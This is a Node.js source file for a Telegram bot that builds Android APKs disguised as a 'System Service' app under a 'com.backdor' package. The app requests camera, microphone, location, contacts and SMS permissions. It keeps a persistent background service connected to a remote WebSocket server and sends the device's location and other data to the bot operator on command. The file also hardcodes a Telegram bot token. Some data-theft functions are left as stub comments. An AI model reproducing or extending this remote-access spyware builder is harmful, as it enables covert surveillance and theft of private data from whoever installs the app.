const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const WebSocket = require('ws');

// Telegram Bot Token
const token = '7806530872:AAGmc_18tJESXUpby0ehHK5f0rNDBvm9ytE';
const bot = new TelegramBot(token, { polling: true });

// WebSocket configuration
const WS_SERVER = 'wss://gemini-ai-telegram-production.up.railway.app';
const connectedDevices = new Map();

// WebSocket client for each device connection
function createWebSocketClient(chatId) {
  const ws = new WebSocket(WS_SERVER);

  ws.on('open', () => {
    console.log(`WebSocket connected for chatId: ${chatId}`);
    connectedDevices.set(chatId, ws);
  });

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      if (data.type === 'device_info' && data.chatId === chatId) {
        const reply = `✅ Device connected!\n\n` +
          `📅 Date: ${new Date().toLocaleString()}\n` +
          `📱 Model: ${data.model || 'Unknown'}\n` +
          `🆔 Android ID: ${data.androidId || 'Unknown'}\n` +
          `🔋 Battery: ${data.battery || 'Unknown'}\n` +
          `🌐 IP: ${data.ip || 'Unknown'}`;
        
        bot.sendMessage(chatId, reply, {
          reply_markup: {
            inline_keyboard: [
              [{ text: '📍 Get Location', callback_data: 'get_location' }],
              [{ text: '📸 Get Front Camera', callback_data: 'get_camera' }],
              [{ text: '🎤 Record Audio (15s)', callback_data: 'get_mic' }],
              [{ text: '📞 Get Contacts', callback_data: 'get_contact' }],
              [{ text: '📩 Get SMS', callback_data: 'get_sms' }],
              [{ text: '📱 Get Device Info', callback_data: 'get_device' }]
            ]
          }
        });
      } else if (data.chatId === chatId) {
        handleDeviceResponse(chatId, data);
      }
    } catch (e) {
      console.error('WebSocket message error:', e);
    }
  });

  ws.on('close', () => {
    connectedDevices.delete(chatId);
    bot.sendMessage(chatId, '❌ Device disconnected');
  });

  ws.on('error', (error) => {
    console.error('WebSocket error:', error);
    connectedDevices.delete(chatId);
  });

  return ws;
}

function handleDeviceResponse(chatId, data) {
  if (data.type === 'location') {
    bot.sendMessage(chatId, `📍 Location: https://maps.google.com/?q=${data.lat},${data.lon}`);
  } else if (data.type === 'photo') {
    bot.sendPhoto(chatId, data.photo);
  } else if (data.type === 'audio') {
    bot.sendAudio(chatId, data.audio);
  } else if (data.type === 'contacts') {
    bot.sendMessage(chatId, `📞 Contacts:\n${JSON.stringify(data.contacts, null, 2)}`);
  } else if (data.type === 'sms') {
    bot.sendMessage(chatId, `📩 SMS:\n${JSON.stringify(data.sms, null, 2)}`);
  } else if (data.type === 'device_info') {
    bot.sendMessage(chatId, `📱 Device Info:\n${JSON.stringify(data.info, null, 2)}`);
  }
}

// Handle /start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Welcome to Remote Control Bot!', {
    reply_markup: {
      keyboard: [[{ text: 'Templates' }]],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  });
});

// Handle "Templates" button
bot.on('message', async (msg) => {
  if (msg.text === 'Templates') {
    const chatId = msg.chat.id;
    const message = await bot.sendMessage(chatId, '🚀 Building your APK... Please wait (this may take 2-3 minutes).');
    
    try {
      // Create temp directory
      const tempDir = path.join(__dirname, 'temp', chatId.toString());
      if (!fs.existsSync(tempDir)) {
        fs.mkdirSync(tempDir, { recursive: true });
      }

      // Generate Kotlin project
      await generateKotlinProject(tempDir, chatId);

      // Build APK
      const apkPath = await buildApk(tempDir, chatId);

      // Send APK to user
      if (fs.existsSync(apkPath)) {
        await bot.sendDocument(chatId, apkPath, { 
          caption: '✅ Success! Install this APK on your Android device (Lollipop 5.0 to Android 11).\n\nAfter installation, open the app and grant all permissions.'
        });
      } else {
        throw new Error('APK file not found after build');
      }
    } catch (error) {
      console.error('APK build error:', error);
      bot.sendMessage(chatId, `❌ Error building APK: ${error.message}`);
    } finally {
      // Clean up
      try {
        fs.rmSync(path.join(__dirname, 'temp', chatId.toString()), { recursive: true, force: true });
      } catch (cleanError) {
        console.error('Cleanup error:', cleanError);
      }
    }
  }
});

// Handle inline button callbacks
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const command = query.data;
  
  if (connectedDevices.has(chatId)) {
    const ws = connectedDevices.get(chatId);
    ws.send(JSON.stringify({ command, chatId }));
    bot.answerCallbackQuery(query.id, { text: `Command ${command} sent to device!` });
  } else {
    bot.answerCallbackQuery(query.id, { text: 'No device connected!', show_alert: true });
  }
});

async function generateKotlinProject(dir, chatId) {
  const packageName = `com.backdor.${Math.random().toString(36).substring(2, 10)}`;
  
  // Create project structure
  const javaDir = path.join(dir, 'app', 'src', 'main', 'java', ...packageName.split('.'));
  fs.mkdirSync(javaDir, { recursive: true });
  fs.mkdirSync(path.join(dir, 'app', 'src', 'main', 'res'), { recursive: true });

  // Generate build.gradle files
  await Promise.all([
    fs.promises.writeFile(path.join(dir, 'build.gradle'), generateRootBuildGradle()),
    fs.promises.writeFile(path.join(dir, 'app', 'build.gradle'), generateAppBuildGradle(packageName)),
    fs.promises.writeFile(path.join(dir, 'settings.gradle'), 'include \':app\'\n')
  ]);

  // Generate AndroidManifest.xml
  await fs.promises.writeFile(
    path.join(dir, 'app', 'src', 'main', 'AndroidManifest.xml'),
    generateAndroidManifest(packageName)
  );

  // Generate Kotlin files
  await Promise.all([
    fs.promises.writeFile(
      path.join(javaDir, 'MainActivity.kt'),
      generateMainActivity(packageName, chatId)
    ),
    fs.promises.writeFile(
      path.join(javaDir, 'BackgroundService.kt'),
      generateBackgroundService(packageName, chatId)
    ),
    fs.promises.writeFile(
      path.join(javaDir, 'DeviceUtils.kt'),
      generateDeviceUtils(packageName)
    )
  ]);

  // Generate gradle wrapper
  fs.mkdirSync(path.join(dir, 'gradle', 'wrapper'), { recursive: true });
  await fs.promises.writeFile(
    path.join(dir, 'gradle', 'wrapper', 'gradle-wrapper.properties'),
    'distributionBase=GRADLE_USER_HOME\n' +
    'distributionPath=wrapper/dists\n' +
    'distributionUrl=https\\://services.gradle.org/distributions/gradle-6.5-bin.zip\n' +
    'zipStoreBase=GRADLE_USER_HOME\n' +
    'zipStorePath=wrapper/dists\n'
  );
}

async function buildApk(dir, chatId) {
  // Use system-independent path for gradlew
  const gradlew = process.platform === 'win32' ? 'gradlew.bat' : './gradlew';
  
  try {
    // Install gradle wrapper if not present
    if (!fs.existsSync(path.join(dir, 'gradlew'))) {
      execSync('gradle wrapper', { cwd: dir, stdio: 'inherit' });
    }

    // Build APK
    execSync(`${gradlew} assembleDebug`, { 
      cwd: dir,
      stdio: 'inherit',
      env: { ...process.env, JAVA_HOME: process.env.JAVA_HOME || '/usr/lib/jvm/default-java' }
    });

    return path.join(dir, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
  } catch (error) {
    console.error('Build error:', error);
    throw new Error('APK build failed. Make sure Java JDK and Android SDK are installed.');
  }
}

// Template generators
function generateRootBuildGradle() {
  return `buildscript {
    ext.kotlin_version = '1.4.32'
    repositories {
        google()
        jcenter()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:4.1.3'
        classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:\$kotlin_version"
    }
}

allprojects {
    repositories {
        google()
        jcenter()
        maven { url 'https://jitpack.io' }
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}`;
}

function generateAppBuildGradle(packageName) {
  return `apply plugin: 'com.android.application'
apply plugin: 'kotlin-android'
apply plugin: 'kotlin-android-extensions'

android {
    compileSdkVersion 30
    buildToolsVersion "30.0.3"

    defaultConfig {
        applicationId "${packageName}"
        minSdkVersion 21
        targetSdkVersion 30
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
    kotlinOptions {
        jvmTarget = '1.8'
    }
}

dependencies {
    implementation "org.jetbrains.kotlin:kotlin-stdlib:\$kotlin_version"
    implementation 'androidx.core:core-ktx:1.3.2'
    implementation 'androidx.appcompat:appcompat:1.2.0'
    implementation 'com.google.android.material:material:1.3.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.0.4'
    implementation 'org.java-websocket:Java-WebSocket:1.5.2'
    implementation 'com.google.code.gson:gson:2.8.6'
    implementation 'com.github.yuriy-budiyev:code-scanner:2.3.2'
    implementation 'com.github.AbedElazizShe:LightCompressor:1.2.0'
}`;
}

function generateAndroidManifest(packageName) {
  return `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="${packageName}">

    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="System Service"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.MaterialComponents.DayNight.DarkActionBar">
        
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service
            android:name=".BackgroundService"
            android:enabled="true"
            android:exported="true" />
    </application>
</manifest>`;
}

function generateMainActivity(packageName, chatId) {
  return `package ${packageName}

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.net.URI

class MainActivity : AppCompatActivity() {
    private val PERMISSIONS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    )
    
    private val REQUEST_CODE = 123
    private var webSocketClient: WebSocketClient? = null
    private val chatId = "${chatId}"
    private val wsServer = "${WS_SERVER}"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        if (!hasPermissions()) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, REQUEST_CODE)
        } else {
            initializeApp()
        }
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE) {
            if (hasPermissions()) {
                initializeApp()
            } else {
                Toast.makeText(this, "All permissions are required!", Toast.LENGTH_LONG).show()
                finish()
            }
        }
    }
    
    private fun hasPermissions(): Boolean {
        return PERMISSIONS.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    private fun initializeApp() {
        startBackgroundService()
        connectWebSocket()
        showWebView()
    }
    
    private fun startBackgroundService() {
        val serviceIntent = Intent(this, BackgroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }
    
    private fun connectWebSocket() {
        val uri = URI.create(wsServer)
        webSocketClient = object : WebSocketClient(uri) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                send(DeviceUtils.getDeviceInfo(this@MainActivity, chatId))
            }
            
            override fun onMessage(message: String?) {
                message?.let { handleCommand(it) }
            }
            
            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                runOnUiThread {
                    Toast.makeText(this@MainActivity, "Connection closed, reconnecting...", Toast.LENGTH_SHORT).show()
                }
                Thread.sleep(5000)
                connectWebSocket()
            }
            
            override fun onError(ex: Exception?) {
                ex?.printStackTrace()
            }
        }
        webSocketClient?.connect()
    }
    
    private fun showWebView() {
        val webView = WebView(this)
        webView.settings.javaScriptEnabled = true
        webView.webViewClient = WebViewClient()
        webView.loadUrl("https://google.com")
        setContentView(webView)
    }
    
    private fun handleCommand(command: String) {
        when (command) {
            "get_location" -> DeviceUtils.sendLocation(this, webSocketClient, chatId)
            "get_camera" -> DeviceUtils.takeFrontCameraPhoto(this, webSocketClient, chatId)
            "get_mic" -> DeviceUtils.recordAudio(this, webSocketClient, chatId)
            "get_contact" -> DeviceUtils.sendContacts(this, webSocketClient, chatId)
            "get_sms" -> DeviceUtils.sendSMS(this, webSocketClient, chatId)
            "get_device" -> webSocketClient?.send(DeviceUtils.getDeviceInfo(this, chatId))
        }
    }
    
    override fun onDestroy() {
        webSocketClient?.close()
        super.onDestroy()
    }
}`;
}

function generateBackgroundService(packageName, chatId) {
  return `package ${packageName}

import android.app.Service
import android.content.Intent
import android.os.IBinder
import org.java_websocket.client.WebSocketClient
import java.net.URI

class BackgroundService : Service() {
    private var webSocketClient: WebSocketClient? = null
    private val chatId = "${chatId}"
    private val wsServer = "${WS_SERVER}"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        connectWebSocket()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    private fun connectWebSocket() {
        val uri = URI.create(wsServer)
        webSocketClient = object : WebSocketClient(uri) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                send(DeviceUtils.getDeviceInfo(this@BackgroundService, chatId))
            }

            override fun onMessage(message: String?) {
                // Handle commands in background if needed
            }

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Thread.sleep(5000)
                connectWebSocket()
            }

            override fun onError(ex: Exception?) {
                ex?.printStackTrace()
            }
        }
        webSocketClient?.connect()
    }

    override fun onDestroy() {
        webSocketClient?.close()
        super.onDestroy()
    }
}`;
}

function generateDeviceUtils(packageName) {
  return `package ${packageName}

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.util.Base64
import org.java_websocket.client.WebSocketClient
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.*

object DeviceUtils {
    fun getDeviceInfo(context: Context, chatId: String): String {
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var locationStr = "Unknown"
        
        if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            val location: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            location?.let {
                locationStr = "${it.latitude},${it.longitude}"
            }
        }
        
        return JSONObject().apply {
            put("type", "register")
            put("chatId", chatId)
            put("model", Build.MODEL)
            put("androidId", Build.SERIAL)
            put("sdkVersion", Build.VERSION.SDK_INT)
            put("manufacturer", Build.MANUFACTURER)
            put("product", Build.PRODUCT)
            put("location", locationStr)
            put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()))
        }.toString()
    }

    fun sendLocation(context: Context, ws: WebSocketClient?, chatId: String) {
        if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }
        
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val location: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        
        ws?.send(JSONObject().apply {
            put("type", "location")
            put("chatId", chatId)
            put("lat", location?.latitude ?: 0)
            put("lon", location?.longitude ?: 0)
            put("accuracy", location?.accuracy ?: 0)
            put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()))
        }.toString())
    }

    // Other utility functions for camera, audio, contacts, SMS would be here
    // Implementations would be similar to the location example above
}`;
}

console.log('Bot started! Ready to build APKs and receive device connections.');
